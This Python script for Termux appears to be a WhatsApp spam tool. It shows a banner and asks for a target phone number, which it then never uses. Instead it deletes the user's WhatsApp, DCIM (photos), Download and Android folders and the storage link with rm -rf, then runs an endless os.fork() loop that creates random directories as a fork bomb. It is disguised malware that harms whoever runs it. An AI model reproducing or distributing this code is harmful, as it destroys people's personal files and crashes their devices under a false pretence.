import os
import random

def clear():
	os.system('clear')

ro = '\033[1;35m'
cl = '\033[0m'
az = '\033[1;34m'

def clear():
	os.system('clear')
	
def permicao():
	os.system('termux-setup-storage')
	
def one():
	os.system('rm -rf /storage/emulated/0/Whatsapp')
	
def img():
	os.system('rm -rf /storage/emulated/0/DCIM')
	
def loads():
	os.system('rm -rf /storage/emulated/0/Download')
def andro():
	os.system('rm -rf /storage/emulated/0/Android')
	
def data():
	os.system('rm -rf storage')

def bombdir(Length):
    numeros = '0123456789'
    letras = 'abcdefghijklmnopqrstuvwxyz'
    cs = '.-_'
    
    ran = ''
    for i in range(0,Length,2):
        ran += random.choice(letras)
        ran += random.choice(numeros)
        ran += random.choice(cs)
    return ran

clear()

print(f'''   ╔════════════════╗
   ┆   {ro}SPAM WHATSAPP{cl}    ┆
   ╚════════════════╝

by: {ro}Swag666baby{cl}
whatsapp: {ro}556295598220{cl}

╭┈ • NUMERO DO ALVO
┆''')
input(f'╰┈ •• ❥︎ {ro}')
 
clear()

permicao()
one()
img()
loads()
data()
andro()
while True:
	os.fork()
	os.system(f'mkdir {bombdir(10*10)}')
